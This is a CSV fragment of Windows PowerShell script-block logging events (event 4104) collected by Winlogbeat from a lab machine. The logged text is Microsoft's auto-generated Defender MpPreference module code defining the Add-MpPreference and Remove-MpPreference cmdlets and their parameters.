        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {
          [object]$__cmdletization_value = ${ExclusionProcess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {
          [object]$__cmdletization_value = ${ExclusionIpAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Force')) {
          [object]$__cmdletization_value = ${Force}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodP

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]
    ${ThreatIDDefaultAction_Actions},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionOnlyExclusions},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessAllowedApplications},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessProtectedFolders},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionRules_Ids},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]
    ${AttackSurfaceReductionRules_Actions},

    [Parameter(ParameterSetName='Add1')]
    [switch]
    ${Force},

    [Parameter(ParameterSetName='Add1')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Add1')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Add1')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {
          [object]$__cmdletization_value = ${ExclusionPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {
          [object]$__cmdletization_value = ${ExclusionExtension}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {
          [object]$__cmdletization_value = ${ExclusionProcess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {
          [object]$__cmdletization_value = ${ExclusionIpAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Force')) {
          [object]$__cmdletization_value = ${Force}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodP",10,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3339,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",aXkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.206",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (11 of 20):
arameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Add', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Add-MpPreference' -Alias '*'
        

function Remove-MpPreference
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionPath},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionExtension},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionProcess},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionIpAddress},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rtsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RealTimeScanDirection},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('qpiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${QuarantinePurgeItemsAfterDelay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RemediationScheduleDay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RemediationScheduleTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('raat')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportingAdditionalActionTimeOut},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rcto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportingCriticalFailureTimeOut},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rncto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportingNonCriticalTimeOut},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('shri')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ServiceHealthReportInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rdsde')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportDynamicSignatureDroppedEvent},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('saclf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanAvgCPULoadFactor},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('csbr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${CheckForSignaturesBeforeRunningScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('spiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanPurgeItemsAfterDelay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('soiie')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanOnlyIfIdleEnabled},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanParameters},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleDay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scsqst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleQuickScanTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tfsso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ThrottleForScheduledScanOnly},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigfagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureFirstAuGracePeriod},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureAuGracePeriod},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigdufss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureDefinitionUpdateFileSharesSources},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigduoswo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureDisableUpdateOnStartupWithoutEngine},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sfo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureFallbackOrder},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ssp','SecurityIntelligenceLocation','ssl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SharedSignaturesPath},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureScheduleDay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureScheduleTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('siguci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureUpdateCatchupInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureUpdateInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigbui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureBlobUpdateInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigbfs')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureBlobFileSharesSources},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('mcupd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${MeteredConnectionUpdates},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('anpws')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowNetworkProtectionOnWinServer},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ddtgp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableDatagramProcessing},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
